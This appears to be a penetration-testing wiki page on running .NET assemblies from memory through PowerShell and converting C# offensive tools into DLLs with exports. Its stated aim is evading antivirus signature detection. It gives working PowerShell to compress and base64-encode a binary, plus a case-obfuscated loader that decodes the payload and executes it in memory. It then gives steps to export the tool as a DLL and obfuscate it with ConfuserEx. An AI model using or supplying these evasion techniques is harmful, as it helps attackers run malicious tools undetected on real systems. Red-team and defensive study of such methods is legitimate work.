# .NET Reflective Assembly

* [https://pscustomobject.github.io/powershell/howto/PowerShell-Add-Assembly/](https://pscustomobject.github.io/powershell/howto/PowerShell-Add-Assembly/)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack#powersharppack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack#powersharppack)
* [https://github.com/GhostPack/Rubeus#sidenote-running-rubeus-through-powershell](https://github.com/GhostPack/Rubeus#sidenote-running-rubeus-through-powershell)
* [https://github.com/cfalta/PowerShellArmoury/blob/master/ConvertTo-Powershell.ps1](https://github.com/cfalta/PowerShellArmoury/blob/master/ConvertTo-Powershell.ps1)
* [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/convert_c%23_to_ps1.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/convert_c%23_to_ps1.ps1)

A way to bypass AV signature analysis: you can Gzip-compress and Base64-encode a .NET assembly to load it reflectively via PowerShell right from memory (when compiling the binary, make `Program` class and its `Main` method public):

{% code title="CompressEncodeAssembly.ps1" %}
```powershell
$bytes = [System.IO.File]::ReadAllBytes("\path\to\binary.exe")
[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream($output, [System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($bytes, 0, $bytes.Length)
$gzipStream.Close()
$output.Close()
[byte[]] $byteOutArray = $output.ToArray()
$encodedZipped = [System.Convert]::ToBase64String($byteOutArray)
$encodedZipped
```
{% endcode %}

This [blog post](https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter) covers the topic in depth.

An example how the binary can be actually decoded, decompressed and run from memory:

```powershell
function Invoke-SomeBinary
{
	[CmdletBinding()]

	PARAM (
		[Parameter(Position = 0, Mandatory = $true)]
		[ValidateNotNullorEmpty()]
		[String]
		$cOmmANd
	)

	$a = NeW-obJeCt sYsTeM.Io.MEMoRysTREaM(,[coNveRT]::frombaSE64sTrINg(""))
	$DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM($a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
	$OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
	$dEcoMPReSSEd.copYto( $outPUt )
	[BYte[]] $ByTEOuTarrAy = $OUtPUT.toarrAY()
	$RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
	$olDconsOLeOuT = [CONSoLe]::out
	$StRInGwritEr = nEW-ObJEct System.IO.STRiNgwRiTEr
	[cONSOLE]::sEtOut($STringWRITer)

	[SomeBinary.Program]::maiN($COMmaND.SPliT(" "))

	[cOnsolE]::sEtout($olDCONsOleout)
	$resUlTs = $sTRInGWRiter.TOSTring()
	$rESuLTs
}
```




## C\# to Unmanaged DLL
* [https://blog.xpnsec.com/rundll32-your-dotnet/](https://blog.xpnsec.com/rundll32-your-dotnet/)

Creating assembly with DLL exports from C# code:

1. Select your favorite C# offensive tool.
2. Install [DllExport](https://www.nuget.org/packages/DllExport/) package via "Manage NuGet Packages for Solution" in VS.
3. Configure DllExport like on the screenshot below and click "Apply".
4. Agree to reload the solution.
5. Edit the Main function code to work with no arguments passed so that the signature looks like `static void Main()`.
6. Add `[DllExport]` attribute before the Main function.
7. Check "Allow unsafe code" and "Optimize code" boxes in Build tab of the solution.
8. Build the solution as Release x64 DLL assembly.
9. (Optional) Obfuscate the assembly with something like [Confuser](https://github.com/XenocodeRCE/neo-ConfuserEx).

![](/.gitbook/assets/010.png)

The resulting DLL will be placed in `.\bin\x64\Release\x64\` directory.

{% hint style="warning" %}
Author's note: *I’m not sure why it requires so much finessing, but I’m open to any optimizations or explanations if anyone knows. Specifically, only the DLL in the `\x64\` directory will work, for some reason the one that’s under `\Release\` does not contain the entrypoint that should be generated by `[DllExport]`, even though it’s built at the same time as the one in `\x64\`.*
{% endhint %}
